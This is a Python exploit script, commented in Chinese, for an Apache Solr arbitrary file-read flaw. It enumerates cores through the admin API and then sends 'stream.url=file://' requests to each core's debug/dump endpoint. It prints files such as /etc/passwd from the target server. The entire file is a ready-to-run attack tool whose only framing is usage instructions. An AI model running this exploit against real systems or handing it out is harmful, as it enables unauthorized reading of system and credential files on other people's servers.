import sys
import requests
import json
import xml.dom.minidom

# 错误抛出函数
def PfError():
	print('usage: solr_readfile.py ip port path')
	print('e.g  : solr_readfile.py 127.0.0.1 8983 /etc/passwd')
	exit()

# 判断漏洞是否存在函数
def GetInstancelist(ip,port):
	url = 'http://' + ip + ':' + port + '/solr/admin/cores?indexInfo=false&wt=json'
	headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0'}
	response = requests.get(url, headers=headers)
	if response.status_code !=200:
		print('\n[-] This url not have vulnerability: ' + url)
		exit()
	instancelist = []
	for i in json.loads(response.text)['status'].keys():
		instancelist.append(i)
	return instancelist

# 根据响应格式提取文件内容并显示
def PfFile(r,path):
	flag = r.headers['Content-Type']
	# 响应类型为json格式，采用此处提取响应内容
	if 'json' in flag:
		try:
			result = json.loads(r.text)['streams'][0]['stream']
		except e:
			print('[+] Something is error…… Please contact author increase!')
		print('\n[+] Lucky! filepath:'+path+'\n')
		print(result)
	# 响应类型为xml格式，采用此处提取响应内容
	elif 'xml' in flag:
		DomTree = xml.dom.minidom.parseString(r.text)
		try:
			result = DomTree.documentElement.getElementsByTagName('str')[8].firstChild.data
		except e:
			print('[+] Something is error…… Please contact author increase!')
		print('\n[+] Lucky! filepath:'+path+'\n')
		print(result)
	# 其他的响应格式由此处输出，如果存在的话。
	else:
		print('[+] Find a new type! Please contact author increase!\n'+r.text)
	print('[++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++]')



# 读取文件并提取内容函数
def ReadFile(instancelist,filepath):
	headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0',
	'Content-Type': 'application/x-www-form-urlencoded'}
	data = 'stream.url=file://'+ filepath
	for instancedir in instancelist:
		url = 'http://' + ip + ':' + port + '/solr/' + instancedir + '/debug/dump?param=ContentStreams'
		response = requests.post(url,headers=headers,data=data)
		if response.status_code != 200:
			print('\n[-] This url not have vulnerability: ' + url)
			continue
		print('\n[+] This url have vulnerability: ' + url)
		PfFile(response,filepath)
		

if __name__ == '__main__':
	if len(sys.argv) != 4:
		PfError()
	ip = sys.argv[1]
	port = sys.argv[2]
	filepath = sys.argv[3]
	instancelist = GetInstancelist(ip,port)
	ReadFile(instancelist,filepath)


